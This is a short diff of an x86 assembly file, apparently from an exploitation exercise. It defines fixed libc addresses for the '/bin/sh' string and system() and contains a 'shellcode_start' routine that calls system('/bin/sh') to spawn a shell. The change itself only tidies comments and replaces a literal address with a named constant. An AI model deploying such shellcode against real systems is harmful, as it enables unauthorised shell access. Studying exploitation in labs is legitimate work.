@@ -1,15 +1,16 @@
         .intel_syntax noprefix
 
         .set stack_buffer, 0xbffffe26
-        .set binsh,        0xb7f8cc58 // "/bin/sh" in libc
-        .set libc_system,  0xb7e6b060 // system(3) in libc
+        // "/bin/sh" in libc
+        .set binsh,        0xb7f8cc58
+        // system(3) in libc
+        .set libc_system,  0xb7e6b060
 
         .section .rodata
 
-
 shellcode_start:
         mov DWORD PTR [esp], binsh
-        mov eax, 0xb7e6b060
+        mov eax, libc_system
         call eax
 
 shellcode_padding:
